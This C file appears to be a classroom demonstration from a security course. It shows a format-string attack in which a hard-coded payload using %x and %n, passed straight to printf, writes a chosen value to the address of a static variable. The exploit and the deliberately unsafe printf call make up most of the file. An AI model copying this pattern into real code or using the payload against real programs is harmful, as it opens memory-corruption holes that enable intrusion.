/*CR@IITM 24/7/2017 */
#include <stdio.h>
#include <string.h>

/* modifies print3.c to make print modify some location with an arbitrary number */
/* use %Nx %n*/
static int s;
void main()
{
	char user_string[100];
	printf("%08x\n", &s);
	
	memset(user_string, 0, sizeof(user_string));
	/* user_string can be filled by other means as well such 
           as by a network packet or a scanf */

	/* <2> write an arbitrary number in s */
        /* Change 50 to something else smaller and see the difference */
	strcpy(user_string , "\x2c\xa0\x04\x08 %53x %6$n"); /* First 4 digits should match the address of s */
	printf(user_string);
	printf("\n%d\n", s);
}
